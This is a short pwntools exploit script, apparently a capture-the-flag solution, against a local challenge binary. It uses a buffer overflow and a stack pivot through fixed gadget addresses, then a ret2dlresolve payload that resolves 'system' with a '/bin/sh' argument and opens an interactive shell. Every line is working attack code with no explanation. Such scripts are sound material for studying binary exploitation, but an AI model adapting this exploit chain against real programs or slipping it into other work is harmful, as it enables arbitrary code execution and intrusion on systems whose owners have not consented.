from pwn import *

context.binary = elf = ELF("./dist/challenge")
# p = process("./challenge")
p = remote("localhost", 35123)

POP_RBP = 0x000000000040111d
GADGET = 0x0000000000401142

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=[], data_addr=0x404a00+0x30)

elf64_rel = dlresolve.payload[-24:]
elf64_rel = p64(elf.got.fgets) + elf64_rel[8:]
resolve_payload = dlresolve.payload[:-24] + elf64_rel

rop = ROP(elf)
rop.ret2dlresolve(dlresolve)

payload = b"A"*0x9
payload += p64(POP_RBP)
payload += p64(0x404a00)
payload += p64(GADGET)
print(hex(len(payload)))
p.sendline(payload)

payload = b"//bin/sh\x00"
payload += rop.chain()
payload += p64(POP_RBP)
payload += p64(0x4049f1)
payload += p64(GADGET)
payload += resolve_payload
print(hex(len(payload)))
p.sendline(payload)

p.interactive()
